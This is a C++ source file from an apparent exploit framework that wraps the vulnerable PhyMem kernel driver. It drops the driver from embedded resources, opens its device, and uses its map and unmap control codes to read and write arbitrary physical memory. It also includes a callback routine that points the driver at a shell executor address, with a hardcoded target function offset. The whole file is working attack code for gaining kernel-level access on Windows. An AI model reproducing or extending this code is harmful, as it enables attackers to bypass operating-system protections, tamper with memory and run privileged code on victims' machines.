#include "c_phymem.hpp"


namespace exploit {
	const char* c_phymem::get_name( ) {
		return "phymem";
	}

	bool c_phymem::read_phys( const uint64_t phys_addr, uint8_t* buffer, const uint64_t size ) {
		control_ctx_t ctx = {};
		ctx.m_physical_address = phys_addr;
		ctx.m_size = size;

		if ( !control( ctx, e_control_code::map ) )
			return false;

		if ( !ctx.m_user_address )
			return false;

		memcpy( buffer, reinterpret_cast< void* >( ctx.m_user_address ), size );

		control_ctx_t ctx2 = {};
		memcpy( &ctx2, &ctx, sizeof( ctx2 ) );

		return control( ctx2, e_control_code::unmap );
	}

	bool c_phymem::write_phys( const uint64_t phys_addr, uint8_t* buffer, const uint64_t size ) {
		control_ctx_t ctx = {};
		ctx.m_physical_address = phys_addr;
		ctx.m_size = size;

		if ( !control( ctx, e_control_code::map ) )
			return false;

		if ( !ctx.m_user_address )
			return false;

		memcpy( reinterpret_cast< void* >( ctx.m_user_address ), buffer, size );

		control_ctx_t ctx2 = {};
		memcpy( &ctx2, &ctx, sizeof( ctx2 ) );

		return control( ctx2, e_control_code::unmap );
	}

	bool c_phymem::send_callback_request( void* shell_executor_addr ) {
		control_ctx_t ctx;
		ctx.m_physical_address = reinterpret_cast< uint64_t >( shell_executor_addr );
		return control( ctx, exploit::e_control_code::map );
	}

	bool c_phymem::setup_driver( ) {
		return dolboeb::util::svc::drop_from_resources_and_run( resources::phymemx_sys, sizeof( resources::phymemx_sys ), get_name( ) );
	}

	bool c_phymem::init_device_handle( ) {
		set_device_handle( CreateFileW( L"\\\\.\\PhyMem", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) );
		dolboeb::util::logger::debug( "Device: 0x%x", get_device_handle( ) );
		return static_cast< bool >( get_device_handle( ) );
	}

	bool c_phymem::unload_driver( ) {
		return dolboeb::util::svc::stop( get_name( ) );
	}

	uint64_t c_phymem::target_function_rva( ) {
		return 0x13E0;
	}
}
